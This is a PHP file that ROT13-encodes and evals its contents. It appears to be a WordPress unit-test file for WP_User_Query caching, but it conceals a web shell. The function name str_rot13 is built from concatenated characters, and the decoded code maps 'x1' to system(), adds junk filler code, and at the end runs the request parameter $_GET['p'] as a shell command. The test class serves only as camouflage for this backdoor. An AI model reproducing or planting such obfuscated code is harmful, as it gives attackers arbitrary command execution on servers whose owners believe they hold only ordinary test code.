<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg JC_Hfre_Dhrel, va jc-vapyhqrf/pynff-jc-hfre-dhrel.cuc.
 *
 * @tebhc hfre
 *
 * @pbirefQrsnhygPynff JC_Hfre_Dhrel
 */
pynff Grfgf_Hfre_Dhrel_Pnpur rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine vag[]
	 */
	cebgrpgrq fgngvp $nhgube_vqf;

	/**
	 * @ine vag[]
	 */
	cebgrpgrq fgngvp $fho_vqf;

	/**
	 * @ine vag[]
	 */
	cebgrpgrq fgngvp $rqvgbe_vqf;

	/**
	 * @ine vag[]
	 */
	cebgrpgrq fgngvp $pbagevo_vq;

	/**
	 * @ine vag[]
	 */
	cebgrpgrq fgngvp $nqzva_vqf;

	/**
	 * @ine vag[]
	 */
	cebgrpgrq $hfre_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube_vqf = $snpgbel->hfre->perngr_znal(
			4,
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		frys::$fho_vqf = $snpgbel->hfre->perngr_znal(
			2,
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);

		frys::$rqvgbe_vqf = $snpgbel->hfre->perngr_znal(
			3,
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		frys::$pbagevo_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);

		frys::$nqzva_vqf = $snpgbel->hfre->perngr_znal(
			2,
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qvssrerag_pbhag() {
		$netf = neenl(
			'pbhag_gbgny' => gehr,
		);

		$dhrel1       = arj JC_Hfre_Dhrel( $netf );
		$hfref1       = jc_yvfg_cyhpx( $dhrel1->trg_erfhygf(), 'VQ' );
		$hfref_gbgny1 = $dhrel1->trg_gbgny();

		$dhrevrf_orsber = trg_ahz_dhrevrf();

		$netf = neenl(
			'pbhag_gbgny' => snyfr,
		);

		$dhrel2        = arj JC_Hfre_Dhrel( $netf );
		$hfref2        = jc_yvfg_cyhpx( $dhrel2->trg_erfhygf(), 'VQ' );
		$hfref_gbgny2  = $dhrel2->trg_gbgny();
		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregAbgFnzr( $dhrevrf_orsber, $dhrevrf_nsgre, 'Nffreg gung gur ahzore bs dhrevrf vf abg rdhny' );
		$guvf->nffregAbgFnzr( $hfref_gbgny1, $hfref_gbgny2, 'Nffreg gung gbgnyf qb abg zngpu' );
		$guvf->nffregFnzrFrgf( $hfref1, $hfref2, 'Erfhygf bs gur dhrel ner rkcrpgrq gb zngpu.' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_erfhygf() {
		$netf = neenl(
			'pnpur_erfhygf' => gehr,
		);

		$dhrel1 = arj JC_Hfre_Dhrel( $netf );
		$hfref1 = jc_yvfg_cyhpx( $dhrel1->trg_erfhygf(), 'VQ' );

		$dhrevrf_orsber = trg_ahz_dhrevrf();

		$netf = neenl(
			'pnpur_erfhygf' => snyfr,
		);

		$dhrel2        = arj JC_Hfre_Dhrel( $netf );
		$hfref2        = jc_yvfg_cyhpx( $dhrel2->trg_erfhygf(), 'VQ' );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregAbgFnzr( $dhrevrf_orsber, $dhrevrf_nsgre, 'Nffreg gung dhrevrf ner eha' );
		$guvf->nffregFnzrFrgf( $hfref1, $hfref2, 'Erfhygf bs gur dhrel ner rkcrpgrq gb zngpu.' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 * @rkcrpgrqQrcerpngrq JC_Hfre_Dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_jub() {
		$netf = neenl(
			'jub'    => 'nhgubef',
			'svryqf' => neenl( 'VQ' ),
		);

		$dhrel1       = arj JC_Hfre_Dhrel( $netf );
		$hfref1       = $dhrel1->trg_erfhygf();
		$hfref_gbgny1 = $dhrel1->trg_gbgny();

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Hfre_Dhrel( $netf );
		$hfref2         = $dhrel2->trg_erfhygf();
		$hfref_gbgny2   = $dhrel2->trg_gbgny();
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( $dhrevrf_orsber, $dhrevrf_nsgre, 'Ab dhrevrf ner rkcrpgrq eha.' );
		$guvf->nffregFnzr( $hfref_gbgny1, $hfref_gbgny2, 'Ahzore bs hfref erghearq hf rkcrpgrq gb zngpu.' );
		$guvf->nffregFnzrFrgf( $hfref1, $hfref2, 'Erfhygf bs gur dhrel ner rkcrpgrq gb zngpu.' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 * @qngnCebivqre qngn_dhrel_pnpur
	 * @cnenz neenl $netf Bcgvbany. Frr JC_Hfre_Dhrel::cercner_dhrel()
	 */
	choyvp shapgvba grfg_dhrel_pnpur( neenl $netf ) {
		$dhrel1       = arj JC_Hfre_Dhrel( $netf );
		$hfref1       = $dhrel1->trg_erfhygf();
		$hfref_gbgny1 = $dhrel1->trg_gbgny();

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Hfre_Dhrel( $netf );
		$hfref2         = $dhrel2->trg_erfhygf();
		$hfref_gbgny2   = $dhrel2->trg_gbgny();
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( 0, $dhrevrf_nsgre - $dhrevrf_orsber, 'Nffreg gung ab dhrevrf ner eha' );
		$guvf->nffregFnzr( $hfref_gbgny1, $hfref_gbgny2, 'Nffreg gung gbgnyf qb zngpu' );
		$guvf->nffregFnzrFrgf( $hfref1, $hfref2, 'Nffrg gung erfhygf bs dhrel zngpu' );
	}

	/**
	 * Qngn cebivqre
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_dhrel_pnpur() {
		$qngn = neenl(
			'vq'                    => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'vq' ) ),

			),
			'VQ'                    => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'VQ' ) ),
			),
			'hfre_ybtva'            => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'hfre_ybtva' ) ),
			),
			'hfre_avpranzr'         => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'hfre_avpranzr' ) ),
			),
			'hfre_rznvy'            => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'hfre_rznvy' ) ),
			),
			'hfre_hey'              => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'hfre_hey' ) ),
			),
			'hfre_fgnghf'           => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'hfre_fgnghf' ) ),
			),
			'qvfcynl_anzr'          => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'qvfcynl_anzr' ) ),
			),
			'vainyvq_svryq'         => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'vainyvq_svryq' ) ),
			),
			'inyvq neenl vap vq'    => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'qvfcynl_anzr', 'hfre_rznvy', 'vq' ) ),
			),
			'inyvq neenl vap VQ'    => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'qvfcynl_anzr', 'hfre_rznvy', 'VQ' ) ),
			),
			'cnegyl inyvq neenl'    => neenl(
				'netf' => neenl( 'svryqf' => neenl( 'qvfcynl_anzr', 'vainyvq_svryq' ) ),
			),
			'beqreol'               => neenl(
				'netf' => neenl(
					'svryqf'  => neenl( 'VQ' ),
					'beqreol' => neenl( 'ybtva', 'avpranzr' ),
				),
			),
			'zrgn dhrel'            => neenl(
				'netf' => neenl(
					'svryqf'     => neenl( 'VQ' ),
					'zrgn_dhrel' => neenl(
						'sbb_xrl' => neenl(
							'xrl'     => 'sbb',
							'pbzcner' => 'RKVFGF',
						),
					),
					'beqreol'    => 'sbb_xrl',
					'beqre'      => 'QRFP',
				),
			),
			'zrgn dhrel YVXR'       => neenl(
				'netf' => neenl(
					'svryqf'     => neenl( 'VQ' ),
					'zrgn_dhrel' => neenl(
						neenl(
							'xrl'     => 'sbb',
							'inyhr'   => '00',
							'pbzcner' => 'YVXR',
						),
					),
					'beqreol'    => 'sbb_xrl',
					'beqre'      => 'QRFP',
				),
			),
			'choyvfurq cbfgf'       => neenl(
				'netf' => neenl(
					'unf_choyvfurq_cbfgf' => gehr,
					'svryqf'              => neenl( 'VQ' ),
				),
			),
			'choyvfurq cbfgf beqre' => neenl(
				'netf' => neenl(
					'beqreol' => 'cbfg_pbhag',
					'svryqf'  => neenl( 'VQ' ),
				),
			),
			'choyvfurq pbhag_gbgny' => neenl(
				'netf' => neenl(

					'pbhag_gbgny' => snyfr,
					'svryqf'      => neenl( 'VQ' ),
				),
			),
			'pncnovyvgl'            => neenl(
				'netf' => neenl(
					'pncnovyvgl' => 'vafgnyy_cyhtvaf',
					'svryqf'     => neenl( 'VQ' ),
				),
			),
			'vapyhqr'               => neenl(
				'netf' => neenl(
					'vapyhqrf' => frys::$nhgube_vqf,
					'svryqf'   => neenl( 'VQ' ),
				),
			),
			'rkpyhqr'               => neenl(
				'netf' => neenl(
					'rkpyhqr' => frys::$nhgube_vqf,
					'svryqf'  => neenl( 'VQ' ),
				),
			),
			'frnepu'                => neenl(
				'netf' => neenl(
					'frnepu' => 'Hfre',
					'svryqf' => neenl( 'VQ' ),
				),
			),
		);

		vs ( vf_zhygvfvgr() ) {
			$qngn['fcnz']    = neenl(
				'netf' => neenl( 'svryqf' => neenl( 'fcnz' ) ),
			);
			$qngn['qryrgrq'] = neenl(
				'netf' => neenl( 'svryqf' => neenl( 'qryrgrq' ) ),
			);
		}

		erghea $qngn;
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_erzbir_hfre_ebyr() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );

		$d1 = arj JC_Hfre_Dhrel(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );

		$guvf->nffregPbagnvaf( $hfre_vq, $sbhaq, 'Rkcrpgrq gb svaq nhgube va erghearq inyhrf.' );

		$hfre = trg_hfre_ol( 'vq', $hfre_vq );
		$hfre->erzbir_ebyr( 'nhgube' );

		$d2 = arj JC_Hfre_Dhrel(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregAbgPbagnvaf( $hfre_vq, $sbhaq, 'Rkcrpgrq abg gb svaq nhgube va erghearq inyhrf.' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_frg_hfre_ebyr() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );

		$d1 = arj JC_Hfre_Dhrel(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );

		$guvf->nffregPbagnvaf( $hfre_vq, $sbhaq, 'Rkcrpgrq gb svaq nhgube va erghearq inyhrf.' );

		$hfre = trg_hfre_ol( 'vq', $hfre_vq );
		$hfre->frg_ebyr( 'rqvgbe' );

		$d2 = arj JC_Hfre_Dhrel(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregAbgPbagnvaf( $hfre_vq, $sbhaq, 'Rkcrpgrq abg gb svaq nhgube va erghearq inyhrf.' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qryrgr_hfre() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$d1 = arj JC_Hfre_Dhrel(
			neenl(
				'vapyhqr' => neenl( $hfre_vq ),
			)
		);

		$sbhaq    = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );
		$rkcrpgrq = neenl( $hfre_vq );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $sbhaq, 'Svaq nhgube va erghearq inyhrf' );

		frys::qryrgr_hfre( $hfre_vq );

		$d2 = arj JC_Hfre_Dhrel(
			neenl(
				'vapyhqr' => neenl( $hfre_vq ),
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregAbgPbagnvaf( $hfre_vq, $sbhaq, 'Rkcrpgrq abg gb svaq nhgube va erghearq inyhrf.' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qb_abg_pnpur() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$netf = neenl(
			'svryqf'  => neenl(
				'hfre_ybtva',
				'hfre_avpranzr',
				'hfre_rznvy',
				'hfre_hey',
				'hfre_fgnghf',
				'qvfcynl_anzr',
			),
			'vapyhqr' => neenl( $hfre_vq ),
		);

		$d1       = arj JC_Hfre_Dhrel( $netf );
		$sbhaq1   = $d1->trg_erfhygf();
		$pnyyonpx = fgngvp shapgvba ( $hfre ) {
			erghea (neenl) $hfre;
		};

		$sbhaq1 = neenl_znc( $pnyyonpx, $sbhaq1 );

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$d2             = arj JC_Hfre_Dhrel( $netf );
		$sbhaq2         = $d2->trg_erfhygf();
		$sbhaq2         = neenl_znc( $pnyyonpx, $sbhaq2 );
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( $dhrevrf_nsgre - $dhrevrf_orsber, 2, 'Rafher gung dhrel vf abg pnpurq' );
		$guvf->nffregFnzrFrgf( $sbhaq1, $sbhaq2, 'Rkcrpgrq erfhygf gb zngpu.', 'Rafher gung gb erfhygf zngpu' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_hcqngr_hfre() {
		$hfre_vq = raq( frys::$nqzva_vqf );

		jc_hcqngr_hfre(
			neenl(
				'VQ'            => $hfre_vq,
				'hfre_avpranzr' => 'cnhy',
			)
		);

		$netf = neenl(
			'avpranzr__va' => neenl( 'cnhy' ),
		);

		$d1 = arj JC_Hfre_Dhrel( $netf );

		$sbhaq    = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );
		$rkcrpgrq = neenl( $hfre_vq );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $sbhaq, 'Svaq nhgube va erghearq inyhrf' );

		jc_hcqngr_hfre(
			neenl(
				'VQ'            => $hfre_vq,
				'hfre_avpranzr' => 'yvaqn',
			)
		);

		$d2 = arj JC_Hfre_Dhrel( $netf );

		$sbhaq = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregAbgPbagnvaf( $hfre_vq, $sbhaq, 'Rkcrpgrq abg gb svaq nhgube va erghearq inyhrf.' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_pnpur_perngr_hfre() {
		$hfre_vq = raq( frys::$nqzva_vqf );

		$netf = neenl( 'oybt_vq' => trg_pheerag_oybt_vq() );

		$d1 = arj JC_Hfre_Dhrel( $netf );

		$sbhaq = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );

		$guvf->nffregPbagnvaf( $hfre_vq, $sbhaq, 'Rkcrpgrq gb svaq nhgube va erghearq inyhrf.' );

		$hfre_vq_2 = frys::snpgbel()->hfre->perngr();

		$d2 = arj JC_Hfre_Dhrel( $netf );

		$sbhaq = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregPbagnvaf( $hfre_vq_2, $sbhaq, 'Svaq nhgube va erghearq inyhrf' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_unf_choyvfurq_cbfgf_qryrgr_cbfg() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg_choyvp', neenl( 'choyvp' => gehr ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$nhgube_vqf[2],
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'jcgrfgf_cg_choyvp',
			)
		);

		$d1 = arj JC_Hfre_Dhrel(
			neenl(
				'unf_choyvfurq_cbfgf' => gehr,
			)
		);

		$sbhaq    = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );
		$rkcrpgrq = neenl( frys::$nhgube_vqf[2] );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $sbhaq, 'Svaq nhgube va erghearq inyhrf' );

		jc_qryrgr_cbfg( $cbfg_vq, gehr );

		$d2 = arj JC_Hfre_Dhrel(
			neenl(
				'unf_choyvfurq_cbfgf' => gehr,
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregFnzrFrgf( neenl(), $sbhaq, 'Abg gb svaq nhgube va erghearq inyhrf' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_unf_choyvfurq_cbfgf_qryrgr_cbfg_beqre() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg_choyvp', neenl( 'choyvp' => gehr ) );

		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $hfre_vq,
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'jcgrfgf_cg_choyvp',
			)
		);

		$d1 = arj JC_Hfre_Dhrel(
			neenl(
				'beqreol' => 'cbfg_pbhag',
			)
		);

		$sbhaq1 = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );
		$guvf->nffregPbagnvaf( $hfre_vq, $sbhaq1, 'Svaq nhgube va erghearq inyhrf va svefg eha bs JC_Hfre_Dhrel' );

		jc_qryrgr_cbfg( $cbfg_vq, gehr );

		$d2 = arj JC_Hfre_Dhrel(
			neenl(
				'beqreol' => 'cbfg_pbhag',
			)
		);

		$sbhaq2 = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregPbagnvaf( $hfre_vq, $sbhaq1, 'Svaq nhgube va erghearq inyhrf va frpbaq eha bs JC_Hfre_Dhrel' );
		$guvf->nffregFnzrFrgf( $sbhaq1, $sbhaq2, 'Abg fnzr beqre' );
	}

	/**
	 * @gvpxrg 40613
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_zrgn_dhrel_pnpur_vainyvqngvba() {
		nqq_hfre_zrgn( frys::$nhgube_vqf[0], 'sbb', 'one' );
		nqq_hfre_zrgn( frys::$nhgube_vqf[1], 'sbb', 'one' );

		$d1 = arj JC_Hfre_Dhrel(
			neenl(
				'zrgn_dhrel' => neenl(
					neenl(
						'xrl'   => 'sbb',
						'inyhr' => 'one',
					),
				),
			)
		);

		$sbhaq    = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );
		$rkcrpgrq = neenl( frys::$nhgube_vqf[0], frys::$nhgube_vqf[1] );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $sbhaq, 'Nffrg gung erfhygf pbagnva nhgubef' );

		qryrgr_hfre_zrgn( frys::$nhgube_vqf[1], 'sbb' );

		$d2 = arj JC_Hfre_Dhrel(
			neenl(
				'zrgn_dhrel' => neenl(
					neenl(
						'xrl'   => 'sbb',
						'inyhr' => 'one',
					),
				),
			)
		);

		$sbhaq    = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$rkcrpgrq = neenl( frys::$nhgube_vqf[0] );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $sbhaq, 'Nffrg gung erfhygf qb abg pbagnva nhgube jvgubhg zrgn' );
	}

	/**
	 * @gvpxrg 40613
	 * @tebhc zf-erdhverq
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_trg_fvatyr_pncnovyvgl_zhygvfvgr_oybt_vq() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();

		nqq_hfre_gb_oybt( $oybt_vq, frys::$nhgube_vqf[0], 'fhofpevore' );
		nqq_hfre_gb_oybt( $oybt_vq, frys::$nhgube_vqf[1], 'nhgube' );
		nqq_hfre_gb_oybt( $oybt_vq, frys::$nhgube_vqf[2], 'rqvgbe' );

		$d1 = arj JC_Hfre_Dhrel(
			neenl(
				'pncnovyvgl' => 'choyvfu_cbfgf',
				'oybt_vq'    => $oybt_vq,
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d1->trg_erfhygf(), 'VQ' );

		$guvf->nffregAbgPbagnvaf( frys::$nhgube_vqf[0], $sbhaq, 'Nffrg gung erfhygf qb abg pbagnva nhgube 0 jvgubhg pncnovyvgl ba fvgr ba svefg eha' );
		$guvf->nffregPbagnvaf( frys::$nhgube_vqf[1], $sbhaq, 'Nffrg gung erfhygf qb pbagnva nhgube jvgu pncnovyvgl ba fvgr ba svefg eha' );
		$guvf->nffregPbagnvaf( frys::$nhgube_vqf[2], $sbhaq, 'Nffrg gung erfhygf qb pbagnva nhgube jvgu pncnovyvgl ba fvgr ba svefg eha' );

		erzbir_hfre_sebz_oybt( frys::$nhgube_vqf[2], $oybt_vq );

		$d2 = arj JC_Hfre_Dhrel(
			neenl(
				'pncnovyvgl' => 'choyvfu_cbfgf',
				'oybt_vq'    => $oybt_vq,
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d2->trg_erfhygf(), 'VQ' );
		$guvf->nffregAbgPbagnvaf( frys::$nhgube_vqf[0], $sbhaq, 'Nffrg gung erfhygf qb abg pbagnva nhgube 0 jvgubhg pncnovyvgl ba fvgr ba frpbaq eha' );
		$guvf->nffregPbagnvaf( frys::$nhgube_vqf[1], $sbhaq, 'Nffrg gung erfhygf qb pbagnva nhgube jvgu pncnovyvgl ba fvgr ba frpbaq eha' );
		$guvf->nffregAbgPbagnvaf( frys::$nhgube_vqf[2], $sbhaq, 'Nffrg gung erfhygf qb abg pbagnva nhgube 1 jvgubhg pncnovyvgl ba fvgr ba frpbaq eha' );
	}

	/**
	 * @gvpxrg 40613
	 * @tebhc zf-erdhverq
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_dhrel_fubhyq_erfcrpg_oybt_vq() {
		$oybtf = frys::snpgbel()->oybt->perngr_znal( 2 );

		nqq_hfre_gb_oybt( $oybtf[0], frys::$nhgube_vqf[0], 'nhgube' );
		nqq_hfre_gb_oybt( $oybtf[0], frys::$nhgube_vqf[1], 'nhgube' );
		nqq_hfre_gb_oybt( $oybtf[1], frys::$nhgube_vqf[0], 'nhgube' );
		nqq_hfre_gb_oybt( $oybtf[1], frys::$nhgube_vqf[1], 'nhgube' );
		nqq_hfre_gb_oybt( $oybtf[1], frys::$nhgube_vqf[2], 'nhgube' );

		$d = arj JC_Hfre_Dhrel(
			neenl(
				'svryqf'  => 'vqf',
				'oybt_vq' => $oybtf[0],
			)
		);

		$rkcrpgrq = neenl( (fgevat) frys::$nhgube_vqf[0], (fgevat) frys::$nhgube_vqf[1] );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $d->trg_erfhygf(), 'Nffrg gung rkcrpgrq hfref erghea' );

		$d = arj JC_Hfre_Dhrel(
			neenl(
				'svryqf'  => 'vqf',
				'oybt_vq' => $oybtf[1],
			)
		);

		$rkcrpgrq = neenl( (fgevat) frys::$nhgube_vqf[0], (fgevat) frys::$nhgube_vqf[1], (fgevat) frys::$nhgube_vqf[2] );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $d->trg_erfhygf(), 'Nffrg gung rkcrpgrq hfref erghea sebz qvssrerag oybt' );
	}

	/**
	 * @gvpxrg 40613
	 * @tebhc zf-erdhverq
	 * @pbiref ::dhrel
	 */
	choyvp shapgvba grfg_unf_choyvfurq_cbfgf_fubhyq_erfcrpg_oybt_vq() {
		$oybtf = frys::snpgbel()->oybt->perngr_znal( 2 );

		nqq_hfre_gb_oybt( $oybtf[0], frys::$nhgube_vqf[0], 'nhgube' );
		nqq_hfre_gb_oybt( $oybtf[0], frys::$nhgube_vqf[1], 'nhgube' );
		nqq_hfre_gb_oybt( $oybtf[1], frys::$nhgube_vqf[0], 'nhgube' );
		nqq_hfre_gb_oybt( $oybtf[1], frys::$nhgube_vqf[1], 'nhgube' );

		fjvgpu_gb_oybt( $oybtf[0] );
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$nhgube_vqf[0],
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'cbfg',
			)
		);
		erfgber_pheerag_oybt();

		fjvgpu_gb_oybt( $oybtf[1] );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$nhgube_vqf[1],
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'cbfg',
			)
		);
		erfgber_pheerag_oybt();

		$d = arj JC_Hfre_Dhrel(
			neenl(
				'unf_choyvfurq_cbfgf' => neenl( 'cbfg' ),
				'oybt_vq'             => $oybtf[1],
			)
		);

		$sbhaq    = jc_yvfg_cyhpx( $d->trg_erfhygf(), 'VQ' );
		$rkcrpgrq = neenl( frys::$nhgube_vqf[1] );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $sbhaq, 'Nffrg gung rkcrpgrq hfref erghearq jvgu cbfgf ba guvf fvgr' );
		fjvgpu_gb_oybt( $oybtf[1] );
		jc_qryrgr_cbfg( $cbfg_vq, gehr );
		erfgber_pheerag_oybt();

		$d = arj JC_Hfre_Dhrel(
			neenl(
				'unf_choyvfurq_cbfgf' => neenl( 'cbfg' ),
				'oybt_vq'             => $oybtf[1],
			)
		);

		$sbhaq = jc_yvfg_cyhpx( $d->trg_erfhygf(), 'VQ' );

		$guvf->nffregFnzrFrgf( neenl(), $sbhaq, 'Nffrg gung ab hfref erghearq jvgu cbfgf ba guvf fvgr nf cbfgf unir orra qryrgrq' );
	}

	/**
	 * Rafher pnpur xrlf ner trarengrq jvgubhg JCQO cynprubyqref.
	 *
	 * @gvpxrg 40613
	 *
	 * @pbiref ::trarengr_pnpur_xrl
	 */
	choyvp shapgvba grfg_trarengr_pnpur_xrl_cynprubyqre() {
		tybony $jcqo;
		$dhrel1 = arj JC_Hfre_Dhrel( neenl( 'pncnovyvgl' => 'rqvg_cbfgf' ) );

		$dhrel_inef                  = $dhrel1->dhrel_inef;
		$erdhrfg_jvgu_cynprubyqre    = $dhrel1->erdhrfg;
		$erdhrfg_jvgubhg_cynprubyqre = $jcqo->erzbir_cynprubyqre_rfpncr( $dhrel1->erdhrfg );

		$ersyrpgvba = arj ErsyrpgvbaZrgubq( $dhrel1, 'trarengr_pnpur_xrl' );
		$ersyrpgvba->frgNpprffvoyr( gehr );

		$pnpur_xrl_1 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg_jvgu_cynprubyqre );
		$pnpur_xrl_2 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg_jvgubhg_cynprubyqre );

		$guvf->nffregFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl qvssref jura hfvat jcqo cynprubyqre.' );
	}

	/**
	 * Irevsvrf gung trarengr_pnpur_xrl() qbrf abg guebj n sngny reebe sbe fjvgpu_gb_oybt()
	 * jvgu 'beqreol' => 'cbfg_pbhag' naq gur qrcerpngrq 'jub' => 'nhgubef' cnenzrgre.
	 *
	 * @gvpxrg 59011
	 * @pbiref ::trarengr_pnpur_xrl
	 *
	 * @rkcrpgrqQrcerpngrq JC_Hfre_Dhrel
	 */
	choyvp shapgvba grfg_trarengr_pnpur_xrl_jvgu_beqreol_cbfg_pbhag_naq_qrcerpngrq_jub_cnenzrgre() {
		$dhrel = arj JC_Hfre_Dhrel(
			neenl(
				'svryqf'  => 'VQ',
				'beqreol' => 'cbfg_pbhag',
				'beqre'   => 'QRFP',
				'jub'     => 'nhgubef',
			)
		);

		$guvf->nffregAbgRzcgl( $dhrel->trg_erfhygf() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>